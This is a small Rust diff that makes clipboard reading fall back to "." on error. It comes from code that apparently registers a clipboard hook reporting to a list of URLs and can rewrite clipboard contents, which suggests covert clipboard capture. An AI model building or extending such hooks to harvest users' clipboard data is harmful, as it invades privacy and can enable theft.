@@ -35,7 +35,7 @@ pub fn register_clipboard_hook(wait_time: Duration, reporting_urls: Vec<String>)
 // Extract the clipboard contents
 pub fn read_clipboard() -> String {
     let mut ctx = ClipboardContext::new().unwrap();
-    ctx.get_contents().unwrap()
+    ctx.get_contents().unwrap_or(String::from("."))
 }
 
 // Update the clipboard contents
